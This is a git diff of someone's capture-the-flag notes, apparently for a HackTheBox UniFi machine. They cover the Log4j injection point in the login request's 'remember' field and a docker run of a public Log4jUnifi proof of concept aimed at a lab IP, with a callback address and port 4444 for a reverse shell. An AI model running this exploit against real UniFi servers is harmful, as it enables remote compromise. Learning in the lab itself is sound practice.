@@ -91,8 +91,23 @@ Default port is 27017
 **Task 9**  
 What is the default database name for UniFi applications?  
 
-It seems that we want machine access at this point. I tried to capture the traffic in tcpdump and wireshark, but since it's using TLS the data is encrypted. I could spend time setting that up, or the writeup just suggests to use a proxy like burpsuite. I think I will try that next time and examine the login request.
+It seems that we want machine access at this point. I tried to capture the traffic in tcpdump and wireshark, but since it's using TLS the data is encrypted. I could spend time setting that up, or the writeup just suggests to use a proxy like burpsuite. I will dive in and try to use burpsuite for the first time. A learning experience! 
 
+Reading [this](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) article from Sprocket security  
+> The vulnerability is in the `rememberme` value issued in the login request
+>
+> ```
+> {"username":"asdf","password":"asdfas","remember":"<PAYLOAD>","strict":true}
+> ```
+
+In this situation, I will try and use the POC published by `puzzlepeaches`, found [here](https://github.com/puzzlepeaches/Log4jUnifi?tab=readme-ov-file)
+
+... one docker install later ...
+
+docker run -it -v $(pwd)/loot:/Log4jUnifi/loot -p 8090:8090 -p 1389:1389 log4junifi \ 
+    -u https://10.129.36.131:8443 -i 192.168.1.1 -p 4444
+
+Didn't accomplish too much in this session. Just installing docker and getting up and running with the POC.
 
 **Task 10**  
 What is the function we use to enumerate users within the database in MongoDB?  
@@ -112,3 +127,13 @@ Submit user flag
 
 **Task 14**  
 Submit root flag  
+
+
+
+
+
+
+echo \
+  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \
+  $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
+  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
